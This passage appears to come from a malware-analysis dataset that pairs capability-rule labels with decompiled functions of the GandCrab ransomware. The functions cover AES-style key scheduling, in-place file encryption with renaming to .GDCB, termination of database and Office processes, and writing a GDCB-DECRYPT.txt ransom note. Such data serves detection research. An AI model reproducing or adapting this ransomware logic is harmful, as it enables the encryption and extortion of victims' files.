L\"c|w{\u00f2ko\u00c50\\x01g+\u00fe\u00d7\u00abv\u00ca\\x82\u00c9}\u00faYG\u00f0\u00ad\u00d4\u00a2\u00af\\x9c\u00a4r\u00c0\u00b7\u00fd\\x93&6?\u00f7\u00cc4\u00a5\u00e5\u00f1q\u00d81\\x15\\x04\u00c7#\u00c3\\x18\\x96\\x05\\x9a\\a\\x12\\x80\u00e2\u00eb\\'\u00b2u\\t\\x83,\\x1a\\x1bnZ\\xa0R;\u00d6\u00b3)\u00e3/\\x84S\u00d1\"\n                    [uVar6 >> 8 & 0xff] ^ *((uVar6 & 0xff) * 4 + 0x40ae40) ^ *0x409210;\n    arg_ch[0x28] = uVar1;\n    uVar4 = uVar4 ^ uVar1;\n    arg_ch[0x29] = uVar4;\n    uVar2 = uVar2 ^ uVar4;\n    arg_ch[0x2a] = uVar2;\n    uVar3 = uVar3 ^ uVar2;\n    arg_ch[0x2b] = uVar3;\n    uVar5 = uVar5 ^ *((uVar3 >> 0x18) * 4 + 0x40ae40) ^ *((uVar3 >> 0x10 & 0xff) * 4 + 0x40aa40) ^\n                    *((uVar3 >> 8 & 0xff) * 4 + 0x40a640) ^\n                    L\"c|w{\u00f2ko\u00c50\\x01g+\u00fe\u00d7\u00abv\u00ca\\x82\u00c9}\u00faYG\u00f0\u00ad\u00d4\u00a2\u00af\\x9c\u00a4r\u00c0\u00b7\u00fd\\x93&6?\u00f7\u00cc4\u00a5\u00e5\u00f1q\u00d81\\x15\\x04\u00c7#\u00c3\\x18\\x96\\x05\\x9a\\a\\x12\\x80\u00e2\u00eb\\'\u00b2u\\t\\x83,\\x1a\\x1bnZ\\xa0R;\u00d6\u00b3)\u00e3/\\x84S\u00d1\"\n                    [uVar3 & 0xff];\n    uVar7 = uVar7 ^ uVar5;\n    uVar8 = uVar8 ^ uVar7;\n    uVar6 = uVar6 ^ uVar8;\n    arg_ch[0x2c] = uVar5;\n    arg_ch[0x2d] = uVar7;\n    arg_ch[0x2e] = uVar8;\n    arg_ch[0x2f] = uVar6;\n    uVar1 = uVar1 ^ *((uVar6 >> 0x18) * 4 + 0x40aa40) ^ *((uVar6 >> 0x10 & 0xff) * 4 + 0x40a640) ^\n                    L\"c|w{\u00f2ko\u00c50\\x01g+\u00fe\u00d7\u00abv\u00ca\\x82\u00c9}\u00faYG\u00f0\u00ad\u00d4\u00a2\u00af\\x9c\u00a4r\u00c0\u00b7\u00fd\\x93&6?\u00f7\u00cc4\u00a5\u00e5\u00f1q\u00d81\\x15\\x04\u00c7#\u00c3\\x18\\x96\\x05\\x9a\\a\\x12\\x80\u00e2\u00eb\\'\u00b2u\\t\\x83,\\x1a\\x1bnZ\\xa0R;\u00d6\u00b3)\u00e3/\\x84S\u00d1\"\n                    [uVar6 >> 8 & 0xff] ^ *((uVar6 & 0xff) * 4 + 0x40ae40) ^ *0x409214;\n    arg_ch[0x30] = uVar1;\n    uVar4 = uVar4 ^ uVar1;\n    arg_ch[0x31] = uVar4;\n    uVar2 = uVar2 ^ uVar4;\n    arg_ch[0x32] = uVar2;\n    uVar3 = uVar3 ^ uVar2;\n    arg_ch[0x33] = uVar3;\n    uVar5 = uVar5 ^ *((uVar3 >> 0x18) * 4 + 0x40ae40) ^ *((uVar3 >> 0x10 & 0xff) * 4 + 0x40aa40) ^\n                    *((uVar3 >> 8 & 0xff) * 4 + 0x40a640) ^\n                    L\"c|w{\u00f2ko\u00c50\\x01g+\u00fe\u00d7\u00abv\u00ca\\x82\u00c9}\u00faYG\u00f0\u00ad\u00d4\u00a2\u00af\\x9c\u00a4r\u00c0\u00b7\u00fd\\x93&6?\u00f7\u00cc4\u00a5\u00e5\u00f1q\u00d81\\x15\\x04\u00c7#\u00c3\\x18\\x96\\x05\\x9a\\a\\x12\\x80\u00e2\u00eb\\'\u00b2u\\t\\x83,\\x1a\\x1bnZ\\xa0R;\u00d6\u00b3)\u00e3/\\x84S\u00d1\"\n                    [uVar3 & 0xff];\n    uVar7 = uVar7 ^ uVar5;\n    uVar8 = uVar8 ^ uVar7;\n    uVar6 = uVar6 ^ uVar8;\n    arg_ch[0x35] = uVar7;\n    arg_ch[0x34] = uVar5;\n    arg_ch[0x36] = uVar8;\n    arg_ch[0x37] = uVar6;\n    uVar1 = uVar1 ^ *((uVar6 >> 0x18) * 4 + 0x40aa40) ^ *((uVar6 >> 0x10 & 0xff) * 4 + 0x40a640) ^\n                    L\"c|w{\u00f2ko\u00c50\\x01g+\u00fe\u00d7\u00abv\u00ca\\x82\u00c9}\u00faYG\u00f0\u00ad\u00d4\u00a2\u00af\\x9c\u00a4r\u00c0\u00b7\u00fd\\x93&6?\u00f7\u00cc4\u00a5\u00e5\u00f1q\u00d81\\x15\\x04\u00c7#\u00c3\\x18\\x96\\x05\\x9a\\a\\x12\\x80\u00e2\u00eb\\'\u00b2u\\t\\x83,\\x1a\\x1bnZ\\xa0R;\u00d6\u00b3)\u00e3/\\x84S\u00d1\"\n                    [uVar6 >> 8 & 0xff] ^ *((uVar6 & 0xff) * 4 + 0x40ae40) ^ *0x409218;\n    arg_ch[0x3c] = 0;\n    uVar4 = uVar4 ^ uVar1;\n    arg_ch[0x38] = uVar1;\n    uVar2 = uVar2 ^ uVar4;\n    arg_ch[0x39] = uVar4;\n    arg_ch[0x3b] = uVar3 ^ uVar2;\n    arg_ch[0x3a] = uVar2;\n    *(arg_ch + 0x3c) = 0xe0;\n    return 0;\n}\n",
        "token_count": 4188
    },
    "00402830": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402830(uint nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EDX;\n    uint uVar3;\n    uint lpNumberOfBytesWritten;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)();\n    uVar3 = 0;\n    if (iVar1 != -1) {\n        if ((in_EDX == 0) || (iVar2 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar1),  iVar2 != 0)) {\n            uVar3 = 1;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 164
    },
    "00402890": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402890(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint nNumberOfBytesToWrite;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint extraout_ECX;\n    uint uVar6;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar6 = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(param_1, 0x80000000, 1, 0, 3, 0, 0);\n    if (iVar2 != -1) {\n        nNumberOfBytesToWrite = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar2, 0);\n        iVar3 = fcn.00403030();\n        iVar4 = fcn.00403030();\n        iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileMappingW)(iVar2, 0, (-(iVar4 != 0) & 0xfffffffa) + 8, 0, 0, 0);\n        if (iVar4 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(iVar4, (-(iVar3 != 0) & 3U) + 1, 0, 0, 0);\n            if (iVar3 != 0) {\n                iVar5 = fcn.00403030();\n                if (iVar5 == 0) {\n                    fcn.00407db0(extraout_ECX);\n                }\n                uVar6 = fcn.00402830(nNumberOfBytesToWrite);\n                (*_sym.imp.KERNEL32.dll_UnmapViewOfFile)(iVar3);\n            }\n            pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            (*pcVar1)(iVar2);\n            return uVar6;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 455
    },
    "004033e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004033e0(char *arg_8h)\n\n{\n    code *pcVar1;\n    char *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint *in_ECX;\n    char *pcVar6;\n    uint var_4h;\n    \n    in_ECX[3] = arg_8h;\n    iVar4 = fcn.004032b0();\n    if ((iVar4 == 0) || (iVar4 == -1)) {\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n        pcVar1 = swi(3);\n        uVar5 = (*pcVar1)();\n        return uVar5;\n    }\n    iVar4 = fcn.00403320();\n    if (iVar4 == 0) {\n        *in_ECX = 0;\n        cVar3 = *arg_8h;\n        if (cVar3 != '\\0') {\n            do {\n                if (cVar3 == '{') {\n                    arg_8h = arg_8h + 1;\n                    iVar4 = fcn.00403190(arg_8h);\n                    if (iVar4 != 0) {\n                        if (iVar4 == 1) {\n                            fcn.00403200(arg_8h, 1);\n                        }\n                        else if (iVar4 == 2) {\n                            cVar3 = *arg_8h;\n                            pcVar6 = arg_8h;\n                            while (cVar3 != '\\0') {\n                                if (cVar3 == '}') goto code_r0x004034bf;\n                                pcVar6 = pcVar6 + 1;\n                                if (cVar3 == '=') break;\n                                cVar3 = *pcVar6;\n                            }\n                            cVar3 = *pcVar6;\n                            pcVar2 = pcVar6;\n                            if (cVar3 != '}') {\n                                while (cVar3 != '\\0') {\n                                    if (*pcVar2 == '}') {\n                                        *pcVar2 = '\\0';\n                                        break;\n                                    }\n                                    cVar3 = pcVar2[1];\n                                    pcVar2 = pcVar2 + 1;\n                                }\n                                iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(pcVar6);\n                                uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar4 + 1);\n                                iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n                                in_ECX[2] = iVar4;\n                                if (iVar4 != 0) {\n                                    (*_sym.imp.KERNEL32.dll_lstrcpyA)(iVar4, pcVar6);\n                                }\n                                *pcVar2 = '}';\n                            }\n                        }\n                    }\n                }\ncode_r0x004034bf:\n                cVar3 = arg_8h[1];\n                arg_8h = arg_8h + 1;\n                if (cVar3 == '\\0') {\n                    return 1;\n                }\n            } while( true );\n        }\n    }\n    else {\n        *in_ECX = 1;\n    }\n    return 1;\n}\n",
        "token_count": 681
    },
    "004035e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong __fastcall fcn.004035e0(uint param_1)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint *arg_10h;\n    uint *arg_10h_00;\n    int32_t iVar5;\n    uint32_t *puVar6;\n    int32_t iVar7;\n    uint extraout_ECX;\n    code *pcVar8;\n    uint var_180h;\n    uint var_88h;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint var_78h;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint var_68h;\n    uint var_64h;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint var_54h;\n    uint var_50h;\n    uint lpString2;\n    uint var_48h;\n    uint var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint lpAddress;\n    uint lpExistingFileName;\n    uint *var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    int32_t hFile;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint lpNumberOfBytesWritten;\n    uint32_t nNumberOfBytesToWrite;\n    uint32_t var_4h;\n    \n    lpExistingFileName = param_1;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(param_1);\n    (*_sym.imp.KERNEL32.dll_SetFileAttributesW)(param_1, uVar3 & 0xfffffffe);\n    var_10h = 0;\n    var_24h = 0;\n    fcn.00405ea0(0, 0, &var_10h, &var_24h);\n    pcVar2 = _sym.imp.KERNEL32.dll_VirtualAlloc;\n    uVar4 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x401, 0x3000, 0x40);\n    lpString2 = 0x47002e;\n    var_48h = 0x430044;\n    var_44h = 0x42;\n    var_1ch = uVar4;\n    (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar4, param_1);\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(uVar4, &lpString2);\n    var_88h = str.GandCrabGandCrabnomoreransom.bit_n._0_4_;\n    uStack136 = str.GandCrabGandCrabnomoreransom.bit_n._4_4_;\n    uStack132 = str.GandCrabGandCrabnomoreransom.bit_n._8_4_;\n    uStack128 = str.GandCrabGandCrabnomoreransom.bit_n._12_4_;\n    var_78h = str.GandCrabGandCrabnomoreransom.bit_n._0_4_;\n    uStack120 = str.GandCrabGandCrabnomoreransom.bit_n._4_4_;\n    uStack116 = str.GandCrabGandCrabnomoreransom.bit_n._8_4_;\n    uStack112 = str.GandCrabGandCrabnomoreransom.bit_n._12_4_;\n    var_68h._0_1_ = 0;\n    var_64h = str.GandCrabGandCrabnomoreransom.bit_n._0_4_;\n    uStack100 = str.GandCrabGandCrabnomoreransom.bit_n._4_4_;\n    uStack96 = str.GandCrabGandCrabnomoreransom.bit_n._8_4_;\n    uStack92 = str.GandCrabGandCrabnomoreransom.bit_n._12_4_;\n    fcn.00407db0(extraout_ECX);\n    fcn.00407db0();\n    arg_10h = (*pcVar2)(0, 0x800, 0x3000, 4);\n    *arg_10h = var_88h;\n    arg_10h[1] = uStack136;\n    arg_10h[2] = uStack132;\n    arg_10h[3] = uStack128;\n    arg_10h[4] = var_78h;\n    arg_10h[5] = uStack120;\n    arg_10h[6] = uStack116;\n    arg_10h[7] = uStack112;\n    var_28h = arg_10h;\n    arg_10h_00 = (*pcVar2)(0, 0x800, 0x3000, 4);\n    *arg_10h_00 = var_64h;\n    arg_10h_00[1] = uStack100;\n    arg_10h_00[2] = uStack96;\n    arg_10h_00[3] = uStack92;\n    var_54h = 0x20;\n    var_50h = 0x10;\n    var_2ch = arg_10h_00;\n    iVar5 = fcn.00406000(var_10h, var_24h, arg_10h, &var_54h, 0x800);\n    pcVar8 = _sym.imp.KERNEL32.dll_VirtualFree;\n    if (iVar5 != 0) {\n        iVar5 = fcn.00406000(var_10h, var_24h, arg_10h_00, &var_50h, 0x800);\n        if (iVar5 == 0) {\n            (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            fcn.00407ee0(&var_88h, &var_180h);\n            iVar5 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpExistingFileName, 0xc0000000, 1, 0, 3, 0x80, 0);\n            pcVar8 = _sym.imp.KERNEL32.dll_VirtualFree;\n            hFile = iVar5;\n            if (iVar5 != -1) {\n                puVar6 = (*pcVar2)(0, 8, 0x3000, 4);\n                *puVar6 = 0;\n                puVar6[1] = 0;\n                var_18h = (*pcVar2)(0, 0x100001, 0x3000, 4);\n                bVar1 = false;\n                var_14h = 0;\n                do {\n                    iVar7 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar5, var_18h, 0x100000, &nNumberOfBytesToWrite, 0);\n                    if ((iVar7 == 0) || (nNumberOfBytesToWrite == 0)) break;\n                    var_38h = 0;\n                    if (nNumberOfBytesToWrite < 0x100000) {\n                        bVar1 = true;\n                    }\n                    uVar3 = *puVar6;\n                    *puVar6 = *puVar6 + nNumberOfBytesToWrite;\n                    puVar6[1] = puVar6[1] + CARRY4(uVar3, nNumberOfBytesToWrite);\n                    var_4h = nNumberOfBytesToWrite;\n                    for (; (nNumberOfBytesToWrite & 0xf) != 0; nNumberOfBytesToWrite = nNumberOfBytesToWrite + 1) {\n                    }\n                    lpAddress = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, nNumberOfBytesToWrite, 0x3000, 4);\n                    fcn.004084e0(lpAddress, var_18h, var_4h);\n                    _var_40h = _var_40h & 0xffffffff | nNumberOfBytesToWrite << 0x20;\n                    iVar5 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, nNumberOfBytesToWrite, 0x3000, 4);\n                    uVar4 = 0;\n                    if (iVar5 != 0) {\n                        fcn.00403500(&var_38h, &var_180h, &var_64h, iVar5);\n                        uVar4 = var_38h;\n                    }\n                    (*_sym.imp.KERNEL32.dll_VirtualFree)(lpAddress, 0, 0x8000);\n                    (*_sym.imp.KERNEL32.dll_SetFilePointer)(hFile, -var_4h, 0, 1);\n                    iVar5 = (*_sym.imp.KERNEL32.dll_WriteFile)\n                                      (hFile, uVar4, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n                    if (iVar5 == 0) {\n                        bVar1 = true;\n                        var_14h = 1;\n                    }\n                    (*_sym.imp.KERNEL32.dll_VirtualFree)(uVar4, 0, 0x8000);\n                    iVar5 = hFile;\n                } while (!bVar1);\n                (*_sym.imp.KERNEL32.dll_VirtualFree)(var_18h, 0, 0x8000);\n                pcVar8 = _sym.imp.KERNEL32.dll_WriteFile;\n                if (var_14h == 0) {\n                    (*_sym.imp.KERNEL32.dll_WriteFile)(iVar5, var_28h, 0x100, &lpNumberOfBytesWritten, 0);\n                    (*pcVar8)(iVar5, var_2ch, 0x100, &lpNumberOfBytesWritten, 0);\n                    (*pcVar8)(iVar5, puVar6, 0x10, &lpNumberOfBytesWritten, 0);\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar5);\n                pcVar8 = _sym.imp.KERNEL32.dll_VirtualFree;\n                var_4h = puVar6[1];\n                var_40h = *puVar6;\n                (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar6, 0, 0x8000);\n                (*pcVar8)(var_28h, 0, 0x8000);\n                (*pcVar8)(var_2ch, 0, 0x8000);\n                uVar4 = var_1ch;\n                if (var_14h == 0) {\n                    (*_sym.imp.KERNEL32.dll_MoveFileW)(lpExistingFileName, var_1ch);\n                }\n                goto code_r0x00403990;\n            }\n        }\n    }\n    _var_40h = 0;\n    var_40h = 0;\n    var_4h = 0;\n    uVar4 = var_1ch;\ncode_r0x00403990:\n    (*pcVar8)(uVar4, 0, 0x8000);\n    return CONCAT44(var_4h, var_40h);\n}\n",
        "token_count": 2441
    },
    "00404640": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00404640(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    uint uVar5;\n    uint uVar6;\n    char16_t *apcStack192 [2];\n    char16_t *pcStack168;\n    char16_t *pcStack164;\n    char16_t *pcStack160;\n    char16_t *pcStack156;\n    char16_t *pcStack152;\n    char16_t *pcStack148;\n    char16_t *pcStack144;\n    char16_t *pcStack140;\n    char16_t *pcStack136;\n    char16_t *pcStack132;\n    char16_t *pcStack128;\n    char16_t *pcStack124;\n    char16_t *pcStack120;\n    char16_t *pcStack116;\n    char16_t *pcStack112;\n    char16_t *pcStack108;\n    char16_t *pcStack104;\n    char16_t *pcStack100;\n    char16_t *pcStack96;\n    char16_t *pcStack92;\n    char16_t *pcStack88;\n    char16_t *pcStack84;\n    char16_t *pcStack80;\n    char16_t *pcStack76;\n    char16_t *pcStack72;\n    char16_t *pcStack68;\n    char16_t *pcStack64;\n    char16_t *pcStack60;\n    char16_t *pcStack56;\n    char16_t *pcStack52;\n    char16_t *pcStack48;\n    char16_t *pcStack44;\n    char16_t *pcStack40;\n    \n    apcStack192[1] = NULL;\n    apcStack192[0] = 0x2;\n    pcStack168 = L\"msftesql.exe\";\n    pcStack164 = L\"sqlagent.exe\";\n    pcStack160 = L\"sqlbrowser.exe\";\n    pcStack156 = L\"sqlservr.exe\";\n    pcStack152 = L\"sqlwriter.exe\";\n    pcStack148 = L\"oracle.exe\";\n    pcStack144 = L\"ocssd.exe\";\n    pcStack140 = L\"dbsnmp.exe\";\n    pcStack136 = L\"synctime.exe\";\n    pcStack132 = L\"mydesktopqos.exe\";\n    pcStack128 = L\"agntsvc.exeisqlplussvc.exe\";\n    pcStack124 = L\"xfssvccon.exe\";\n    pcStack120 = L\"mydesktopservice.exe\";\n    pcStack116 = L\"ocautoupds.exe\";\n    pcStack112 = L\"agntsvc.exeagntsvc.exe\";\n    pcStack108 = L\"agntsvc.exeencsvc.exe\";\n    pcStack104 = L\"firefoxconfig.exe\";\n    pcStack100 = L\"tbirdconfig.exe\";\n    pcStack96 = L\"ocomm.exe\";\n    pcStack92 = L\"mysqld.exe\";\n    pcStack88 = L\"mysqld-nt.exe\";\n    pcStack84 = L\"mysqld-opt.exe\";\n    pcStack80 = L\"dbeng50.exe\";\n    pcStack76 = L\"sqbcoreservice.exe\";\n    pcStack72 = L\"excel.exe\";\n    pcStack68 = L\"infopath.exe\";\n    pcStack64 = L\"msaccess.exe\";\n    pcStack60 = L\"mspub.exe\";\n    pcStack56 = L\"onenote.exe\";\n    pcStack52 = L\"outlook.exe\";\n    pcStack48 = L\"powerpnt.exe\";\n    pcStack44 = L\"steam.exe\";\n    pcStack40 = L\"sqlservr.exe\";\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)();\n    uVar5 = 4;\n    puVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x22c, 0x3000, 4);\n    pcVar4 = _sym.imp.KERNEL32.dll_CloseHandle;\n    if ((puVar2 != NULL) && (*puVar2 = 0x22c,  pcVar4 = _sym.imp.KERNEL32.dll_CloseHandle,  iVar1 != -1)) {\n        (*_sym.imp.KERNEL32.dll_Process32FirstW)(iVar1, puVar2);\n        pcVar4 = _sym.imp.KERNEL32.dll_CloseHandle;\n    }\n    do {\n        uVar3 = 0;\n        uVar6 = uVar5;\n        do {\n            iVar1 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(apcStack192[uVar3], puVar2 + 9);\n            if ((iVar1 == 0) &&\n               (iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(1, 0, puVar2[2]), \n               pcVar4 = _sym.imp.KERNEL32.dll_CloseHandle,  iVar1 != 0)) {\n                (*_sym.imp.KERNEL32.dll_TerminateProcess)(iVar1, 0);\n                pcVar4 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x27);\n        uVar5 = uVar6;\n        iVar1 = (*_sym.imp.KERNEL32.dll_Process32NextW)(uVar6, puVar2);\n    } while (iVar1 != 0);\n    if (puVar2 != NULL) {\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar2, 0, 0x8000);\n    }\n    (*pcVar4)(uVar6);\n    return;\n}\n",
        "token_count": 1233
    },
    "00404eb0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00404eb0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint var_44h;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint *var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_VirtualAlloc;\n    var_10h = &var_44h;\n    var_ch = &var_20h;\n    var_8h = &var_30h;\n    var_20h = 0x69736d65;\n    var_1ch = 0x74666f73;\n    var_18h = 0x7469622e;\n    var_14h._0_1_ = 0;\n    var_44h = *0x410960;\n    uStack68 = *0x410964;\n    uStack64 = *0x410968;\n    uStack60 = *0x41096c;\n    var_34h._0_1_ = 0;\n    var_30h = 0x646e6167;\n    var_2ch = 0x62617263;\n    var_28h = 0x7469622e;\n    var_24h._0_1_ = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x100, 0x3000, 4);\n    if (iVar1 != 0) {\n        iVar3 = 0;\n        iVar4 = 0;\n        while( true ) {\n            var_4h = (&var_10h)[iVar4];\n            iVar4 = iVar4 + 1;\n            if (iVar4 == 3) {\n                iVar4 = 0;\n            }\n            if (iVar3 == -1) {\n                (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar1, 0x3000, 4);\n            uVar2 = (*pcVar5)(0, iVar3 * 2 + 2);\n            fcn.00404d60();\n            iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(uVar2, \"fabian wosar <3\");\n            if (iVar3 != 0) break;\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(uVar2, 0, 0x8000);\n            iVar3 = -1;\n            pcVar5 = _sym.imp.KERNEL32.dll_VirtualAlloc;\n        }\n        (*_sym.imp.USER32.dll_wsprintfW)(iVar1, 0x40ff64, uVar2);\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(uVar2, 0, 0x8000);\n    }\n    return iVar1;\n}\n",
        "token_count": 740
    },
    "00405270": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405270(int32_t param_1)\n\n{\n    uchar *puVar1;\n    uchar uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uchar *puVar10;\n    uint hObject;\n    uint var_10h;\n    uint var_ch;\n    uint lpBaseAddress;\n    uint var_4h;\n    \n    uVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x404, 0x3000, 0x40);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, uVar3, 0x200);\n    iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(uVar3, 0x80000000, 1, 0, 3, 0x80, 0);\n    if (iVar4 != -1) {\n        iVar5 = (*_sym.imp.KERNEL32.dll_CreateFileMappingW)(iVar4, 0, 8, 0, 0, 0);\n        if (iVar5 != 0) {\n            iVar6 = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(iVar5, 1, 0, 0, 0);\n            if (iVar6 != 0) {\n                puVar1 = iVar6 + 0x4e;\n                iVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n                uVar9 = 0;\n                param_1 = param_1 + iVar7 * 2;\n                uVar8 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar1);\n                puVar10 = puVar1;\n                if ((uVar8 & 0x7fffffff) != 0) {\n                    do {\n                        if ((uVar9 & 1) == 0) {\n                            uVar2 = *puVar10;\n                            puVar10 = puVar10 + 1;\n                            *(uVar9 + param_1) = uVar2;\n                        }\n                        else {\n                            *(uVar9 + param_1) = 0;\n                        }\n                        uVar9 = uVar9 + 1;\n                        iVar7 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar1);\n                    } while (uVar9 < iVar7 * 2);\n                }\n                (*_sym.imp.KERNEL32.dll_UnmapViewOfFile)(iVar6);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar5);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n    }\n    (*_sym.imp.KERNEL32.dll_VirtualFree)(uVar3, 0, 0x8000);\n    return;\n}\n",
        "token_count": 630
    },
    "00406640": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.00406640(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    bool bVar4;\n    uint var_4h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x402, 0x3000, 0x40);\n    (*_sym.imp.USER32.dll_wsprintfW)(uVar1, L\"%s\\\\GDCB-DECRYPT.txt\");\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(uVar1, 0x40000000, 0, 0, 1, 0x80, 0);\n    if (iVar2 == -1) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        bVar4 = iVar2 == 0xb7;\n    }\n    else {\n        if (*0x412b04 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*0x412b04, &var_4h, 0);\n            (*_sym.imp.KERNEL32.dll_WriteFile)(iVar2, *0x412b04, iVar3 * 2);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        bVar4 = true;\n    }\n    (*_sym.imp.KERNEL32.dll_VirtualFree)(uVar1, 0, 0x8000);\n    return bVar4;\n}\n",
        "token_count": 326
    },
    "004066f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
